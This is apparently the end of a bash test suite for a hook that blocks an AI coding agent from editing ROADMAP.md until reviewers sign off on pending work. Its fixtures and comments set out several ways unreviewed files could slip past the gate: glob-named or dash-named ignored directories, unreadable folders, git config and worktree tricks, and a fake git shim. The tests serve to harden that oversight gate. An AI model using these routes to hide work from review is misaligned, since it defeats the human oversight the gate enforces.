printf '<div role="dialog" aria-modal="true">never reviewed</div>\n' > "$d/src/routes/Modal.svelte"
fakebin=$(mktemp -d) || exit 1
cat > "$fakebin/git" <<'SHIM'
#!/bin/sh
if [ "$1" = "rev-parse" ] && [ "$2" = "--git-dir" ]; then
  echo "fatal: something else entirely broke" >&2
  exit 128
fi
exec /usr/bin/git "$@"
SHIM
chmod +x "$fakebin/git"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$fakebin:$PATH" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
rm -rf "$fakebin"
printf '%s' "$out" | grep -q '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"' &&
  ok "git rev-parse --git-dir failing for a non-repo reason still blocks" ||
  no "git rev-parse --git-dir failing for a non-repo reason still blocks" "gate output: $out"
rm -rf "$d"

# The genuinely-not-a-repo case must still be silent, since that is the one
# case `git rev-parse --git-dir` failing is actually supposed to allow.
d=$(mktemp -d) || exit 1
assert_sandbox "$d" >/dev/null
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash "$HOOKS_SRC/review-board-gate.sh" <<<"$GATE_STDIN" 2>&1)
[ -z "$out" ] &&
  ok "a directory that is genuinely not a git repo still produces no output" ||
  no "a directory that is genuinely not a git repo still produces no output" "gate output: $out"
rm -rf "$d"

# `is_artifact`'s old `local IFS=/; for seg in $p` left `$p` UNQUOTED, which
# re-enables PATHNAME EXPANSION as well as the intended word-splitting -- a
# path segment that is itself a glob (`tmp/*/Modal.svelte`) expanded against
# the CWD, and `node_modules` is always present in a real checkout, so a
# bare `*` segment always matched ARTIFACT_DIRS and the file silently
# dropped out of the walk. Not reachable under `src/`/`static/` (the
# src-first rule returns before reaching a later glob segment), so this
# needs a hidden directory at the repo root, matching the shape used
# throughout this file (`tmp/`).
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/tmp/*"
printf '<button>Open</button>\n' > "$d/tmp/*/Modal.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
printf '<div role="dialog" aria-modal="true">no focus trap</div>\n' > "$d/tmp/*/Modal.svelte"
# The repo root also needs a real ARTIFACT_DIRS-named directory for the glob
# to land on, sorting before `src`/`static` (which short-circuit is_artifact's
# scan the same way whether the bug is present or not) -- `node_modules` is
# what a real checkout always has and what the comment above describes.
# Without this, the fixture's own root (src/static/scripts/seed.txt, no
# node_modules) happens to hit the `src|static` early-return before any
# ARTIFACT_DIRS name, so the broken and fixed code produce the same result
# and this probe passes either way (confirmed: reverting the fix left it
# green until this directory was added).
mkdir -p "$d/node_modules"
expect_block "$d" "a glob character in a hidden path is not expanded against the CWD"
rm -rf "$d"

# `find -L "$dir" ...` with `$dir` passed bare: a directory literally named
# `-lab` is parsed as an unknown OPTION FLAG rather than a path, `find`
# errors to stderr (swallowed by every `2>/dev/null` downstream), and the
# whole directory silently drops out of the walk with no refusal. This fixes
# walk_hidden_dir's own `./` prefix (the arm this probe actually pins --
# confirmed by break-and-restore; an earlier version of this comment claimed
# it also pinned the depth/cap pre-check loop's separate `./` prefix a few
# lines below in work-hash.sh, which is false: deleting only that arm left
# the suite green here, because walk_hidden_dir still enumerates a READABLE
# rewrite correctly on its own. See the next probe for what the pre-check
# loop's arm actually guards.)
d=$(new_repo) || exit 1
(cd "$d" && printf -- '-lab/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p -- "$d/-lab"
printf '<button>Open</button>\n' > "$d/-lab/Modal.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
printf '<div role="dialog" aria-modal="true">no focus trap</div>\n' > "$d/-lab/Modal.svelte"
expect_block "$d" "a hidden directory name starting with a dash is not mistaken for a find option"
rm -rf "$d"

# The depth/cap pre-check loop's OWN `./` prefix (work-hash.sh, just before
# the d12/d13 depth check) is a second, independent arm from walk_hidden_dir's.
# It guards the readability probe that fires for a genuinely unreadable
# subdirectory. Deleting only this arm leaves the probe above green (a
# readable rewrite still reaches the hash via walk_hidden_dir's intact
# prefix), so it needs its own fixture: an UNREADABLE subdirectory nested
# inside a dash-named ignored directory. With the prefix gone, `find -L -lab
# ...` for the permission probe is parsed as an unknown option and returns
# empty -- as if nothing were unreadable -- so the loop falls through to
# walk_hidden_dir, which itself cannot read INTO a chmod 000 directory
# either. The dedicated "cannot be read" refusal this loop exists to raise
# never fires, and an unreviewed component inside the unreadable directory
# clears the gate with no error at all.
d=$(new_repo) || exit 1
(cd "$d" && printf -- '-lab/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p -- "$d/-lab/secret"
printf '<div role="dialog" aria-modal="true">never reviewed</div>\n' > "$d/-lab/secret/Modal.svelte"
chmod 000 "$d/-lab/secret"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
chmod 755 "$d/-lab/secret"
printf '%s' "$out" | grep -q "cannot be read" &&
  ok "a dash-prefixed hidden directory's unreadable subdirectory blocks" ||
  no "a dash-prefixed hidden directory's unreadable subdirectory blocks" "gate was silent: $out"
rm -rf "$d"

# `git status --ignored=matching` fatals outright when `status.
# showUntrackedFiles=no` is also in effect ("Unsupported combination of
# ignored and untracked-files arguments", exit 128) -- not degraded, dead.
# Every call site redirected stderr to /dev/null, so the fatal read as
# "nothing is ignored" rather than as an error. There are SIX
# `--ignored=matching` call sites total (two in `compute_work_hash`'s own
# enumeration, one each in the gitlink and worktree ignored-scans, one in
# `waiver_forbidden_paths`, plus an emptiness-only check that never parses
# individual paths and so was never vulnerable). Setting the config on THIS
# repo directly (no embedded repo or worktree needed) reaches the THREE
# sites that run against the current repo without `-C`; the worktree and
# gitlink sites have their own dedicated probes elsewhere in this file.
# Both the gate and the waiver path are checked here, since they read
# different enumerations.
d=$(new_repo) || exit 1
(cd "$d" && printf 'lab/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
mkdir -p "$d/lab"
printf '<div role="dialog" aria-modal="true">forbidden</div>\n' > "$d/lab/Modal.svelte"
git -C "$d" config status.showUntrackedFiles no
expect_block "$d" "status.showUntrackedFiles=no does not defeat the ignored-directory scan on the gate path"
out=$(signoff "$d" --waive --grounds formatting-only --reason r 2>&1)
printf '%s' "$out" | grep -q "Modal.svelte" &&
  ok "status.showUntrackedFiles=no does not defeat the ignored-directory scan on the waiver path" ||
  no "status.showUntrackedFiles=no does not defeat the ignored-directory scan on the waiver path" "waived cleanly: $out"
rm -rf "$d"

# The linked-worktree guard's `--ignored=matching` scan (mirroring the
# gitlink one) was entirely absent, not merely defeatable -- a worktree's
# own committed .gitignore hid a component from status with no config lie
# needed at all.
#
# The `.gitignore` rule is committed and SIGNED OFF in the MAIN repo
# BEFORE the branch is cut, so `wtbranch`'s tip is the SAME commit the
# outer repo is already at (no divergence for the ref sweep to catch) AND
# there is no OTHER unreviewed work outstanding (a first version of this
# probe skipped the sign-off entirely, so expect_block passed trivially on
# the .gitignore commit being new unreviewed work, without the ignored-scan
# guard ever being exercised -- caught by reverting the guard and finding
# the probe still passed). Modal.svelte is added UNCOMMITTED in the
# worktree, same as the showUntrackedFiles=no probe's Sneaky.svelte, so the
# only thing left that could make this block is the guard under test.
d=$(new_repo) || exit 1
(cd "$d" && printf 'ui/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
wt=$(mktemp -d) || exit 1
rm -rf "$wt"
git -C "$d" branch wtbranch >/dev/null 2>&1
git -C "$d" worktree add "$wt" wtbranch -q >/dev/null 2>&1
mkdir -p "$wt/ui"
printf '<div role="dialog" aria-modal="true">forbidden</div>\n' > "$wt/ui/Modal.svelte"
expect_block "$d" "a component hidden by a linked worktree's own .gitignore still blocks"
git -C "$d" worktree remove "$wt" --force >/dev/null 2>&1
rm -rf "$wt"
rm -rf "$d"

# The waiver-side gitlink expansion still used plain `ls-files` (tracked
# only), so an untracked component behind an embedded repo's own
# `status.showUntrackedFiles=no` waived cleanly with the round-2 fix in
# place -- it only appeared fixed because the demonstrating fixture sat
# under `src/`, where the refusal actually fired on the gitlink's own
# tracked `.gitignore` matching the `src/` WAIVER_NEVER prefix, never on
# the hidden component itself. `scripts/` is outside every WAIVER_NEVER
# pattern, so this isolates the real gap. Checked directly against
# waiver_forbidden_paths, not just the end-to-end signoff flow: the whole
# gate also refuses via compute_work_hash's OWN dirty-embedded-repo check,
# which would mask this exact function still being blind.
#
# What this fixture actually pins is NOT the `--cached --others
# --exclude-standard` expansion described above -- the component here sits
# inside `ui/`, which the vendor repo's OWN `.gitignore` hides, and git
# collapses an entirely-ignored directory to one `!!` line that `--others`
# never lists at all. It is caught instead by the separate blanket refusal
# a few lines further down (`status --porcelain --ignored=matching`, "has
# content ... that a waiver cannot individually verify"), which fires on
# ANY status output for the gitlink -- untracked, modified, or ignored --
# and so subsumes the `--others` expansion for this exact fixture. Reverting
# the `--others --exclude-standard` line to plain `ls-files` leaves this
# probe green; reverting the blanket refusal fails it. Correcting the
# earlier claim that this probe "isolates the real gap" in that line --
# it isolates a real gap, just not that one.
d=$(new_repo) || exit 1
mkdir -p "$d/scripts/vendor/ui"
(cd "$d/scripts/vendor" && git init -q && printf 'ui/\n' > .gitignore && echo r > README.txt \
  && git add -A && git commit -qm v && git config status.showUntrackedFiles no) >/dev/null 2>&1
printf '<div role="dialog" aria-modal="true">no trap</div>\n' > "$d/scripts/vendor/ui/Modal.svelte"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; waiver_forbidden_paths; echo "F=[$WAIVER_FORBIDDEN] E=[$WORK_ERROR]"')
printf '%s' "$out" | grep -q "vendor" &&
  ok "waiver_forbidden_paths itself catches an untracked component behind an embedded showUntrackedFiles=no" ||
  no "waiver_forbidden_paths itself catches an untracked component behind an embedded showUntrackedFiles=no" "$out"
rm -rf "$d"
# ---------------------------------------------------------------------------
# The PreToolUse TRIGGER itself.
#
# Everything above varies what the gate evaluates. Nothing varied WHEN it
# evaluates, which is the arm that changed when this moved from Stop to
# PreToolUse -- and a reviewer demonstrated the consequence: making `is_gated=1`
# unconditional AND turning the fail-closed missing-path arm into `exit 0` left
# the whole suite at 108/108. A silent fail-open in the gate's one deliberate
# refusal fired no probe at all.
#
# These drive the gate through `gate_with_stdin` rather than `gate`, because the
# whole point is to vary the stdin `gate` holds fixed.
gate_with_stdin() {
  local d="$1" stdin="$2" out rc
  cmp -s "$d/.claude/hooks/review-board-gate.sh" "$HOOKS_SRC/review-board-gate.sh" || return 2
  bash -n "$d/.claude/hooks/review-board-gate.sh" 2>/dev/null || return 2
  out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$stdin" 2>&1)
  rc=$?
  printf '%s' "$out" | grep -q '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"' && return 1
  [ "$rc" -eq 0 ] || return 2
  return 0
}

# Unreviewed work in flight for every case below, so an allow can only come from
# the trigger deciding this call is none of its business.
d=$(new_repo) || exit 1
mkdir -p "$d/src/routes"
printf '<button>Open</button>\n' > "$d/src/routes/Modal.svelte"

# A path that is positively confirmed NOT gated: the one case that allows.
gate_with_stdin "$d" '{"tool_input":{"file_path":"src/routes/Modal.svelte"}}'
case $? in
  0) ok "a tool call targeting a non-roadmap file is allowed through" ;;
  1) no "a tool call targeting a non-roadmap file is allowed through" "gate denied" ;;
  2) no "a tool call targeting a non-roadmap file is allowed through" "gate did not run to completion" ;;
esac

# The gated files themselves, both spellings and both relative/absolute forms.
for target in "ROADMAP.md" "ROADMAP.local.md" "$d/ROADMAP.md" "$d/ROADMAP.local.md"; do
  gate_with_stdin "$d" "{\"tool_input\":{\"file_path\":\"$target\"}}"
  case $? in
    1) ok "a tool call targeting $target is denied without a sign-off" ;;
    0) no "a tool call targeting $target is denied without a sign-off" "gate allowed" ;;
    2) no "a tool call targeting $target is denied without a sign-off" "gate did not run to completion" ;;
  esac
done

# THE FAIL-CLOSED ARM. A call whose target cannot be determined must deny, never
# allow: "cannot tell" is indistinguishable from a bypass to anything relying on
# this gate. Three shapes of undeterminable, each independently able to regress.
for label in "an absent file_path field" "malformed json" "an empty file_path"; do
  case "$label" in
    "an absent file_path field") payload='{"tool_input":{}}' ;;
    "malformed json")            payload='{"tool_input":' ;;
    "an empty file_path")        payload='{"tool_input":{"file_path":""}}' ;;
  esac
  gate_with_stdin "$d" "$payload"
  case $? in
    1) ok "$label denies rather than silently allowing" ;;
    0) no "$label denies rather than silently allowing" "gate allowed -- fail-open" ;;
    2) no "$label denies rather than silently allowing" "gate did not run to completion" ;;
  esac
done

# And the allow arm must still hold once the work IS signed off, or the gate
# would deny forever and the probes above would pass for the wrong reason.
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
gate_with_stdin "$d" '{"tool_input":{"file_path":"ROADMAP.md"}}'
case $? in
  0) ok "a signed-off body of work allows the roadmap edit through" ;;
  1) no "a signed-off body of work allows the roadmap edit through" "gate denied after a full sign-off" ;;
  2) no "a signed-off body of work allows the roadmap edit through" "gate did not run to completion" ;;
esac
rm -rf "$d"


printf '\n%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
